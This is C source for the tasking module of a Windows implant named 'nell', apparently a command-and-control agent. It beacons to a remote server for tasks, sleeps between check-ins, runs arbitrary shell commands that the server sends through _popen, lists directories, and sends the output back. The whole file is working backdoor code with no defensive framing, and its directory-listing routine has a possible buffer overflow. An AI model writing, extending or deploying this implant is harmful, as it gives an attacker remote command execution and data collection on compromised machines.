#include <windows.h>
#include <stdio.h>
#include "Command.h"
#include "Utils.h"
#include "nell.h"

BOOL routine()
{
    LOG("[*] routine: Asking for new tasks...");
    PPackage getTask = PackageCreate();
    if (!getTask) return FALSE;

    PackageAddByte(getTask, GET_TASKING);
    PackageAddInt32(getTask, NUMBER_OF_TASKS);

    PParser ResponseParser = sendPackage(getTask);
    PackageDestroy(getTask);

    if (ResponseParser)
    {
        LOG("[+] routine: Received response.");
        commandDispatch(ResponseParser);
        ParserDestroy(ResponseParser);
    }
    else
    {
        LOG("[-] routine: No response or failure.");
    }

    DWORD sleepMs = nellConfig->sleeptime * 1000;
    LOG("[*] routine: Sleeping %d ms...", sleepMs);
    Sleep(sleepMs); 

    return TRUE;
}

BOOL commandDispatch(PParser response)
{
    if (!response) return FALSE;

    BYTE typeResponse = ParserGetByte(response);
    LOG("[*] commandDispatch: Response type: 0x%02X", typeResponse);
    
    if (typeResponse == GET_TASKING)
        return handleGetTasking(response);

    return TRUE;
}

BOOL handleGetTasking(PParser getTasking)
{
    UINT32 numTasks = ParserGetInt32(getTasking);
    LOG("[*] handleGetTasking: numTasks = %d", numTasks);
    
    for (UINT32 i = 0; i < numTasks; i++)
    {
        SIZE_T totalSize = (SIZE_T)ParserGetInt32(getTasking);
        LOG("[*] Task %d size: %llu", i, totalSize);
        
        if (totalSize < 1) continue;
        
        SIZE_T payloadSize = totalSize - 1;

        BYTE taskID = ParserGetByte(getTasking);
        LOG("[*] Task ID: 0x%02X", taskID);
        
        PBYTE taskBuffer = ParserGetBytesRaw(getTasking, payloadSize);
        PParser taskParser = ParserCreate(taskBuffer, payloadSize);
        if (taskBuffer) LocalFree(taskBuffer);

        if (taskID == SHELL_CMD && taskParser) 
        {
            LOG("[*] Executing SHELL_CMD");
            executeShell(taskParser);
        }
        else if (taskID == DIR_LIST && taskParser)
        {
             LOG("[*] Executing DIR_LIST");
             executeDir(taskParser);
        }
        else
        {
            LOG("[-] Unknown task or invalid parser");
        }
        
        if (taskParser) ParserDestroy(taskParser);
    }
    return TRUE;
}

BOOL executeShell(PParser arguments)
{
    SIZE_T uuidLen = 0;
    PBYTE uuidBytes = ParserGetBytes(arguments, &uuidLen);
    
    if (!uuidBytes) 
    {
        LOG("[-] executeShell: Failed to get UUID");
        return FALSE;
    }

    PCHAR taskUuid = (PCHAR)LocalAlloc(LPTR, uuidLen + 1);
    if (!taskUuid) { LocalFree(uuidBytes); return FALSE; }
    memcpy(taskUuid, uuidBytes, uuidLen);
    taskUuid[uuidLen] = '\0';
    LocalFree(uuidBytes);
    
    LOG("[*] Task UUID: %s", taskUuid);

    UINT32 nbArg = ParserGetInt32(arguments);
    (void)nbArg;

    SIZE_T cmdLen = 0;
    PBYTE cmdBytes = ParserGetBytes(arguments, &cmdLen);
    
    if (!cmdBytes)
    {
        LOG("[-] executeShell: Failed to get CMD");
        LocalFree(taskUuid);
        return FALSE;
    }

    SIZE_T extendedSize = cmdLen + 6;
    PCHAR cmd = (PCHAR)LocalAlloc(LPTR, extendedSize);
    if (!cmd) { LocalFree(taskUuid); LocalFree(cmdBytes); return FALSE; }
    
    memcpy(cmd, cmdBytes, cmdLen);
    cmd[cmdLen] = '\0';
    strcat(cmd, " 2>&1");
    LocalFree(cmdBytes);

    LOG("[*] Command to run: %s", cmd);

    PPackage responseTask = PackageCreate();
    PackageAddByte(responseTask, POST_RESPONSE);
    PackageAddBytes(responseTask, (PBYTE)taskUuid, uuidLen);
    PPackage output = PackageCreate();

    LOG("[*] invoking _popen...");
    FILE* fp = _popen(cmd, "rb");
    if (fp)
    {
        CHAR path[1035];
        while (fgets(path, sizeof(path), fp) != NULL)
        {
            PackageAddBytesRaw(output, (PBYTE)path, strlen(path));
        }
        _pclose(fp);
    }
    else
    {
        LOG("[-] _popen failed");
        CHAR* err = "Failed to run command";
        PackageAddBytesRaw(output, (PBYTE)err, strlen(err));
    }
    
    LOG("[*] Output size: %d", output->length);
    PackageAddBytes(responseTask, (PBYTE)output->buffer, output->length);

    LOG("[*] Sending POST_RESPONSE...");
    PParser ResponseParser = sendPackage(responseTask);
    
    if (ResponseParser)
    {
        LOG("[+] POST_RESPONSE succcess");
        ParserDestroy(ResponseParser);
    }
    else
    {
        LOG("[-] POST_RESPONSE failed");
    }
    
    PackageDestroy(responseTask);
    PackageDestroy(output);
    LocalFree(taskUuid);
    LocalFree(cmd);

    return TRUE;
}

BOOL executeDir(PParser arguments)
{
    // 1. Get Task UUID
    SIZE_T uuidLen = 0;
    PBYTE uuidBytes = ParserGetBytes(arguments, &uuidLen);
    
    if (!uuidBytes) 
    {
        LOG("[-] executeDir: Failed to get UUID");
        return FALSE;
    }

    PCHAR taskUuid = (PCHAR)LocalAlloc(LPTR, uuidLen + 1);
    if (!taskUuid) { LocalFree(uuidBytes); return FALSE; }
    memcpy(taskUuid, uuidBytes, uuidLen);
    taskUuid[uuidLen] = '\0';
    LocalFree(uuidBytes);
    
    LOG("[*] Task UUID: %s", taskUuid);

    // 2. Num Args
    UINT32 nbArg = ParserGetInt32(arguments);
    (void)nbArg;
    
    // 3. Get Path
    SIZE_T cmdLen = 0;
    PBYTE cmdBytes = ParserGetBytes(arguments, &cmdLen);
    
    // Prepare Response Packages
    PPackage responseTask = PackageCreate();
    PackageAddByte(responseTask, POST_RESPONSE);
    PackageAddBytes(responseTask, (PBYTE)taskUuid, uuidLen);
    PPackage output = PackageCreate();

    if (!cmdBytes)
    {
        LOG("[-] executeDir: Failed to get Path");
        // We still send response, but with error
        char* err = "Missing path argument";
        PackageAddBytesRaw(output, (PBYTE)err, strlen(err));
    }
    else
    {
        PCHAR path = (PCHAR)LocalAlloc(LPTR, cmdLen + 3); // +3 for \*, \0
        if (path)
        {
            memcpy(path, cmdBytes, cmdLen);
            path[cmdLen] = '\0';
            
            // Logic to handle "dir ." command from shell which often means "current directory"
            if (strcmp(path, ".") == 0)
            {
                GetCurrentDirectoryA(cmdLen + 3, path); // Overwrite with full path if possible, or just use *
                // actually GetCurrentDirectory needs size. simple:
                strcpy(path, "*");
            }
            else
            {
                // Simple logic: if it doesn't end in *, append \*
                // Assumes input is a directory path
                char last = path[strlen(path)-1];
                if (last != '*')
                {
                    if (last != '\\' && last != '/')
                        strcat(path, "\\*");
                    else
                        strcat(path, "*");
                }
            }
            
            LOG("[*] Listing directory: %s", path);
            
            WIN32_FIND_DATA findData;
            HANDLE hFind = FindFirstFile(path, &findData);
            
            if (hFind == INVALID_HANDLE_VALUE)
            {
                char* err = "Failed to list directory";
                PackageAddBytesRaw(output, (PBYTE)err, strlen(err));
            }
            else
            {
                do
                {
                    // Output format: Name\n
                    PackageAddBytesRaw(output, (PBYTE)findData.cFileName, strlen(findData.cFileName));
                    PackageAddBytesRaw(output, (PBYTE)"\n", 1);
                } while (FindNextFile(hFind, &findData));
                FindClose(hFind);
            }
            LocalFree(path);
        }
        LocalFree(cmdBytes);
    }
    
    LOG("[*] Output size: %d", output->length);
    PackageAddBytes(responseTask, (PBYTE)output->buffer, output->length);

    LOG("[*] Sending POST_RESPONSE...");
    PParser ResponseParser = sendPackage(responseTask);
    
    if (ResponseParser)
    {
        LOG("[+] POST_RESPONSE succcess");
        ParserDestroy(ResponseParser);
    }
    
    PackageDestroy(responseTask);
    PackageDestroy(output);
    LocalFree(taskUuid);

    return TRUE;
}
